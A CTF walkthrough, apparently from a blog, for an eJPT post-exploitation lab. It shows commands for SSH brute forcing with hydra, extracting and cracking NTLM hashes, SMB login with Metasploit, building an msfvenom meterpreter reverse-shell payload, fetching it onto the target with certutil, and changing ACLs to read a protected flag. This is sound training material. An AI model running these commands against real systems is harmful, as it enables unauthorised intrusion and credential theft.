# eJPT : Host & Network Penetration Testing: Post-Exploitation CTF 2

https://medium.com/@murat_kuzucu/ejpt-host-network-penetration-testing-post-exploitation-ctf-2-105fdf6fc548

Let’s start with nmap scan on our target.

<img alt="" class="bh ko mr c jop-noMdConv" width="700" height="132" loading="eager" role="presentation" src="../../../_resources/1_rreYLSAnN2ppOVLFO8h_8Q.png" style="box-sizing: inherit; vertical-align: middle; background-color: #ffffff; width: 680px; max-width: 100%; height: auto;">

ssh,smb,rdp services are open.

“**Flag 1:** An insecure ssh user named **alice** lurks in the system.”

lets do bruteforce attack on ssh.

```
hydra -l alice -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target.ine.local ssh
```

we have found credentials.

so lets take look on ssh service.

```
ssh alice<span style="color: rgb(170, 13, 145);">@target</span>.ine.local
```

<img alt="" class="bh ko mr c jop-noMdConv" width="700" height="285" loading="lazy" role="presentation" src="../../../_resources/1_SXIlsglZforfJ4vvB6mnqQ.png" style="box-sizing: inherit; vertical-align: middle; background-color: #ffffff; width: 680px; max-width: 100%; height: auto;">

we got our first flag

“**Flag 2:** Using the hashdump file discovered in the previous challenge, can you crack the hashes and compromise a user?”

lets download hashdump file via ssh with scp.

```
scp alice<span style="color: rgb(170, 13, 145);">@target</span>.ine.<span style="color: rgb(170, 13, 145);">local</span>:hashdump.txt hashdump.txt
```

<img alt="" class="bh ko mr c jop-noMdConv" width="700" height="374" loading="lazy" role="presentation" src="../../../_resources/1_n3T9rgrkNaojRAvfncraRw.png" style="box-sizing: inherit; vertical-align: middle; background-color: #ffffff; width: 680px; max-width: 100%; height: auto;">

we have a hash file like this.

we can code a python script to seperate usernames and hashes

```
<span style="color: rgb(170, 13, 145);">def</span> extract_ntlm_hashes(<span style="color: rgb(92, 38, 153);">input_file, ntlm_output_file, username_output_file, user_hash_output_file</span>):
    <span style="color: rgb(196, 26, 22);">"""
    Extracts usernames and NTLM hashes from the input file and writes them to separate files and combined user:hash file.
    :param input_file: The name of the input file containing the full hashdump.
    :param ntlm_output_file: The name of the output file for NTLM hashes.
    :param username_output_file: The name of the output file for usernames.
    :param user_hash_output_file: The name of the output file for user:hash pairs.
    """</span>
    <span style="color: rgb(170, 13, 145);">try</span>:
        <span style="color: rgb(170, 13, 145);">with</span> <span style="color: rgb(92, 38, 153);">open</span>(input_file, <span style="color: rgb(196, 26, 22);">'r'</span>) <span style="color: rgb(170, 13, 145);">as</span> infile, \
             <span style="color: rgb(92, 38, 153);">open</span>(ntlm_output_file, <span style="color: rgb(196, 26, 22);">'w'</span>) <span style="color: rgb(170, 13, 145);">as</span> ntlm_outfile, \
             <span style="color: rgb(92, 38, 153);">open</span>(username_output_file, <span style="color: rgb(196, 26, 22);">'w'</span>) <span style="color: rgb(170, 13, 145);">as</span> username_outfile, \
             <span style="color: rgb(92, 38, 153);">open</span>(user_hash_output_file, <span style="color: rgb(196, 26, 22);">'w'</span>) <span style="color: rgb(170, 13, 145);">as</span> user_hash_outfile:
            <span style="color: rgb(170, 13, 145);">for</span> line <span style="color: rgb(170, 13, 145);">in</span> infile:
                parts = line.strip().split(<span style="color: rgb(196, 26, 22);">":"</span>)
                <span style="color: rgb(170, 13, 145);">if</span> <span style="color: rgb(92, 38, 153);">len</span>(parts) >= <span style="color: rgb(28, 0, 207);">4</span>:  <span style="color: rgb(0, 116, 0);"># Ensure line has enough parts</span>
                    username = parts[<span style="color: rgb(28, 0, 207);">0</span>]
                    ntlm_hash = parts[<span style="color: rgb(28, 0, 207);">3</span>]
                    <span style="color: rgb(170, 13, 145);">if</span> ntlm_hash != <span style="color: rgb(196, 26, 22);">"aad3b435b51404eeaad3b435b51404ee"</span>:  <span style="color: rgb(0, 116, 0);"># Skip LM hash placeholders</span>
                        ntlm_outfile.write(<span style="color: rgb(196, 26, 22);">f"<span style="color: rgb(0, 0, 0);">{ntlm_hash}</span>\n"</span>)
                        username_outfile.write(<span style="color: rgb(196, 26, 22);">f"<span style="color: rgb(0, 0, 0);">{username}</span>\n"</span>)
                        user_hash_outfile.write(<span style="color: rgb(196, 26, 22);">f"<span style="color: rgb(0, 0, 0);">{username}</span>:<span style="color: rgb(0, 0, 0);">{ntlm_hash}</span>\n"</span>)
        <span style="color: rgb(92, 38, 153);">print</span>(<span style="color: rgb(196, 26, 22);">f"NTLM hashes extracted successfully to '<span style="color: rgb(0, 0, 0);">{ntlm_output_file}</span>'"</span>)
        <span style="color: rgb(92, 38, 153);">print</span>(<span style="color: rgb(196, 26, 22);">f"Usernames extracted successfully to '<span style="color: rgb(0, 0, 0);">{username_output_file}</span>'"</span>)
        <span style="color: rgb(92, 38, 153);">print</span>(<span style="color: rgb(196, 26, 22);">f"User:Hash pairs extracted successfully to '<span style="color: rgb(0, 0, 0);">{user_hash_output_file}</span>'"</span>)
    <span style="color: rgb(170, 13, 145);">except</span> FileNotFoundError:
        <span style="color: rgb(92, 38, 153);">print</span>(<span style="color: rgb(196, 26, 22);">f"Error: The file '<span style="color: rgb(0, 0, 0);">{input_file}</span>' was not found."</span>)
    <span style="color: rgb(170, 13, 145);">except</span> Exception <span style="color: rgb(170, 13, 145);">as</span> e:
        <span style="color: rgb(92, 38, 153);">print</span>(<span style="color: rgb(196, 26, 22);">f"An error occurred: <span style="color: rgb(0, 0, 0);">{e}</span>"</span>)

<span style="color: rgb(0, 116, 0);"># Example usage</span>
input_filename = <span style="color: rgb(196, 26, 22);">"hashdump.txt"</span>  <span style="color: rgb(0, 116, 0);"># Replace with your input filename</span>
ntlm_output_filename = <span style="color: rgb(196, 26, 22);">"ntlm_hashes.txt"</span>  <span style="color: rgb(0, 116, 0);"># Replace with your NTLM output filename</span>
username_output_filename = <span style="color: rgb(196, 26, 22);">"usernames.txt"</span>  <span style="color: rgb(0, 116, 0);"># Replace with your username output filename</span>
user_hash_output_filename = <span style="color: rgb(196, 26, 22);">"user_hash_pairs.txt"</span>  <span style="color: rgb(0, 116, 0);"># Replace with your user:hash output filename</span>
extract_ntlm_hashes(input_filename, ntlm_output_filename, username_output_filename, user_hash_output_filename)
```

```
python3 script.py
```

<img alt="" class="bh ko mr c jop-noMdConv" width="700" height="99" loading="lazy" role="presentation" src="../../../_resources/1_h1fYqQuKFIXCr7VyJuqR1g.png" style="box-sizing: inherit; vertical-align: middle; background-color: #ffffff; width: 680px; max-width: 100%; height: auto;">

now we have three files, lets crack ntlm-hashes with john-the-ripper

```
john --format=nt --wordlist=/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ntlm_hashes.txt
```

we have cracked two hashes lets write on a file and use for bruteforce.

there is an metasploit module that named smb_login,

lets use with our usernames,passwords files.

set rhosts target.ine.local

set USER_FILE usernames.txt

set PASS_FILE passwords.txt

set CreateSession true

run

<img alt="" class="bh ko mr c jop-noMdConv" width="700" height="153" loading="lazy" role="presentation" src="../../../_resources/1_rFH42NaJyi6iz4B7XYGb0w.png" style="box-sizing: inherit; vertical-align: middle; background-color: #ffffff; width: 680px; max-width: 100%; height: auto;">

we also have found correct credentials for these users.

<img alt="" class="bh ko mr c jop-noMdConv" width="661" height="342" loading="lazy" role="presentation" src="../../../_resources/1_-h-MqTQjdUYS-QGUCDlsoQ.png" style="box-sizing: inherit; vertical-align: middle; background-color: #ffffff; width: 661px; max-width: 100%; height: auto;">

nothing useful here.

lets try ssh with user david.

<img alt="" class="bh ko mr c jop-noMdConv" width="700" height="591" loading="lazy" role="presentation" src="../../../_resources/1_xq4vdF4T__PzG69t8hOKhg.png" style="box-sizing: inherit; vertical-align: middle; background-color: #ffffff; width: 680px; max-width: 100%; height: auto;">

flag3:“Can you escalate privileges and read the flag in C://Windows//System32//config directory?”

lets create msfvenom shell:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<lhost> LPORT=1234 -f exe > shell.exe
```

so we going to transfer our shell file with certutil and python3 http.server

```
<span style="color: rgb(0, 116, 0);">#on local</span>
python3 -m http.server 80
<span style="color: rgb(0, 116, 0);">#on target</span>
certutil.exe -urlcache -<span style="color: rgb(92, 38, 153);">split</span> -f http://<localmachine>/shell.exe shell.exe
```

after transfering our file in C:\\Temp\\ directory,

lets use metasploit multi/handler

set payload windows/meterpreter/reverse_tcp

set lhost,lport

run

and, run shell.exe

<img alt="" class="bh ko mr c jop-noMdConv" width="700" height="132" loading="lazy" role="presentation" src="../../../_resources/1_AFsW1MIelID9ck8z6apqBg.png" style="box-sizing: inherit; vertical-align: middle; background-color: #ffffff; width: 680px; max-width: 100%; height: auto;"> <img alt="" class="bh ko mr c jop-noMdConv" width="700" height="94" loading="lazy" role="presentation" src="../../../_resources/1_ERxaC97K4dUc_yivUEox4g.png" style="box-sizing: inherit; vertical-align: middle; background-color: #ffffff; width: 680px; max-width: 100%; height: auto;">

we can try easy method to escalate our privilege getsystem. and it works!!

“Can you escalate privileges and read the flag in C://Windows//System32//config directory?”

i have answered this question but, its buggy.

<img alt="" class="bh ko mr c jop-noMdConv" width="699" height="359" loading="lazy" role="presentation" src="../../../_resources/1_dwhR8m6kyc3ORflBb2z9Ww.png" style="box-sizing: inherit; vertical-align: middle; background-color: #ffffff; width: 680px; max-width: 100%; height: auto;">

flag4: “Looks like the flag present in the Administrator’s home denies direct access.”

<img alt="" class="bh ko mr c jop-noMdConv" width="690" height="675" loading="lazy" role="presentation" src="../../../_resources/1_uBeYw_RTmwF_K23UGBCG-A.png" style="box-sizing: inherit; vertical-align: middle; background-color: #ffffff; width: 680px; max-width: 100%; height: auto;">

we cant change directory to flag because

<img alt="" class="bh ko mr c jop-noMdConv" width="700" height="280" loading="lazy" role="presentation" src="../../../_resources/1_HKK5xbldZuzBwzC2NcxxAA.png" style="box-sizing: inherit; vertical-align: middle; background-color: #ffffff; width: 680px; max-width: 100%; height: auto;">

SYSTEM user permission denied.

we can change it:

```
icacls flag /remove:d <span style="color: rgb(196, 26, 22);">"NT AUTHORITY\SYSTEM"</span>
```

<img alt="" class="bh ko mr c jop-noMdConv" width="700" height="471" loading="lazy" role="presentation" src="../../../_resources/1_XP14qHy_CQTpPkeSpLOSMg.png" style="box-sizing: inherit; vertical-align: middle; background-color: #ffffff; width: 680px; max-width: 100%; height: auto;">

we can read it now.